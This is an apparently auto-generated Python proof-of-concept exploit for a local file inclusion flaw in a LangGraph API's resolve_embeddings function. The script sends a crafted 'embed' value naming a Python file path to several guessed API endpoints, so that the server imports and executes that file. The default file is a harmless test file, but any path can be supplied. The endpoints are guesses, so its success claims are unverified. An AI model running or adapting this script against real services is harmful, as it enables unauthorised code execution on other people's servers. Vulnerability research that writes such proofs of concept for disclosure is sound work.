#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-028
# Sink: resolve_embeddings
# Auto-generated — run with: python3 lfi_if_string_contains_resolve_embeddings.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_api_src's resolve_embeddings function.

Vulnerability: The 'embed' parameter in index_config is attacker-controlled and can contain
path traversal sequences (e.g., '../') or absolute paths. When the string contains '.py:',
the code splits on ':' and uses the left part as a file path. If the path contains '/',
it loads the file via importlib.util.spec_from_file_location without any sanitization.

Impact: An attacker can load and execute arbitrary Python files on the filesystem,
leading to local file inclusion (LFI) and potentially remote code execution (RCE).

This PoC demonstrates the vulnerability by attempting to load a benign Python file
(e.g., /etc/passwd won't work as it's not Python, so we use a test file we create).
"""

import requests
import sys
import os
import tempfile
import argparse

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000"

def create_test_payload_file():
    """Create a benign Python file to demonstrate LFI."""
    # Create a temporary Python file that just defines a harmless function
    tmp_dir = tempfile.mkdtemp()
    payload_path = os.path.join(tmp_dir, "poc_test.py")
    
    with open(payload_path, "w") as f:
        f.write("""
# Benign test payload for LFI PoC
def get_embeddings():
    # This function would normally return embeddings
    # For PoC, we just return a string to prove execution
    return "POC_EXECUTED_SUCCESSFULLY"
""")
    
    return payload_path, tmp_dir

def exploit_lfi(target_url, file_path):
    """
    Attempt to exploit the LFI vulnerability.
    
    Args:
        target_url: Base URL of the target service
        file_path: Path to the Python file to load (e.g., /tmp/test.py)
    
    Returns:
        Response text if successful, None otherwise
    """
    # The vulnerable endpoint is likely a graph execution endpoint
    # We need to find the correct API endpoint that accepts index_config
    
    # Common endpoints that might accept index_config
    endpoints = [
        "/api/graphs/default/execute",
        "/api/graphs/default/invoke",
        "/api/graphs/default/stream",
        "/api/graphs/default/run",
        "/api/execute",
        "/api/invoke",
    ]
    
    # Craft the malicious payload
    # The embed string must contain '.py:' to trigger the vulnerable code path
    # Format: <file_path>:<function_name>
    malicious_embed = f"{file_path}:get_embeddings"
    
    payload = {
        "index_config": {
            "embed": malicious_embed
        },
        # Add other required fields that might be needed
        "input": {"messages": [{"role": "user", "content": "test"}]},
        "config": {}
    }
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        print(f"[*] Trying endpoint: {url}")
        
        try:
            # Try POST with JSON body
            response = requests.post(
                url,
                json=payload,
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text[:500]}")
            
            # Check if we got a response that indicates successful execution
            if response.status_code == 200:
                if "POC_EXECUTED_SUCCESSFULLY" in response.text:
                    print("[+] SUCCESS! LFI exploit worked!")
                    return response.text
                elif "Could not find embeddings file" in response.text:
                    print("[!] File not found - path may be incorrect")
                elif "Could not import embeddings module" in response.text:
                    print("[!] Module import failed - file may not be valid Python")
                else:
                    print("[*] Got response but unclear if exploit worked")
                    return response.text
                    
        except requests.exceptions.ConnectionError:
            print(f"    [!] Connection refused - endpoint may not exist")
        except requests.exceptions.Timeout:
            print(f"    [!] Timeout - endpoint may not exist")
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    return None

def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langgraph_api_src resolve_embeddings"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--file",
        help="Path to Python file to load (default: creates a test file)"
    )
    parser.add_argument(
        "--create-test",
        action="store_true",
        help="Create a test Python file and use it for the exploit"
    )
    
    args = parser.parse_args()
    
    # Create or use specified file
    if args.file:
        file_path = args.file
        cleanup_dir = None
        print(f"[*] Using specified file: {file_path}")
    else:
        print("[*] Creating benign test payload file...")
        file_path, cleanup_dir = create_test_payload_file()
        print(f"[*] Created test file at: {file_path}")
        print(f"[*] File contents:")
        with open(file_path, "r") as f:
            print(f.read())
    
    print(f"\n[*] Attempting LFI exploit against {args.target}")
    print(f"[*] Using file path: {file_path}")
    print(f"[*] This will attempt to load the file via importlib.util.spec_from_file_location")
    print(f"[*] If successful, the file's get_embeddings function will be executed\n")
    
    result = exploit_lfi(args.target, file_path)
    
    if result:
        print(f"\n[+] Exploit completed. Response received.")
    else:
        print(f"\n[-] Exploit did not succeed on any endpoint.")
        print("[*] The target may not be running or the API endpoints differ.")
        print("[*] Try different endpoints or check if the service is accessible.")
    
    # Cleanup
    if cleanup_dir:
        import shutil
        shutil.rmtree(cleanup_dir, ignore_errors=True)
        print(f"[*] Cleaned up temporary files")

if __name__ == "__main__":
    main()
